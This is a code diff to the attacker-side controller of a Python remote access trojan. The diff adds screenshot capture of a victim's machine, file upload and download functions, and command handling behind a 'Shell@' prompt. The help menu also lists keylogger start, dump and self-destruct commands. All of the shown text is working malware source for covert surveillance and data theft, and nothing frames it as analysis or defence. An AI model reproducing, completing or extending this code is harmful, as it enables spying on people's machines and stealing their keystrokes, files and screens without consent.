@@ -16,6 +16,7 @@ def help():
         cd <directory>      : Changes directory on target machine
         upload <filename>   : Upload file to target machine
         download <filename> : Doanload file to target machine
+        screenshot          : Take a screenshot of target machine
         keylog start        : Start keylogger
         keylog dump         : Print keystokes that target inputted
         keylog stop         : Stop and self destruct keylogger file
@@ -23,7 +24,19 @@ def help():
     """
     return help
 
+def upload_file(filename):
+    with open(filename, "rb") as file:
+        target.send(file.read())
 
+def download_file(filename):
+    with open(filename, "wb") as file:
+        chunk = target.recv(1024)
+        while chunk:
+            file.write(chunk)
+            try:
+                chunk = target.recv(1024)
+            except socket.timeout:
+                break
 
 def reliable_recv():
     data = ""
@@ -32,11 +45,11 @@ def reliable_recv():
             data = data + target.recv(1024).decode()
         except Exception as e:
             print(e)
-
         return data
 
 
 def target_connection():
+    count = 0
     while True:
         command = input(f"Shell@({termcolor.colored(ip[0],'cyan')}):~$ ")
         target.send(command.encode())
@@ -47,7 +60,27 @@ def target_connection():
             print(help())
         elif command == "clear":
             os.system("clear")
+        elif command[:2] == "cd":
+            pass
 
+        elif command[:6] == "upload":
+            upload_file(command[7:])
+
+        elif command[:8] == "download":
+            download_file(command[9:])
+
+        elif command[:10] == "screenshot":
+            with open(f"screenshot_{ip[0]}_{count}.png", "wb") as file:
+                target.settimeout(3)
+                chunk = target.recv(1024)
+                while chunk:
+                    file.write(chunk)
+                    try:
+                        chunk = target.recv(1024)
+                    except socket.timeout:
+                        break
+                target.settimeout(None)
+            count += 1
         else:
             response = reliable_recv()
             print(response)
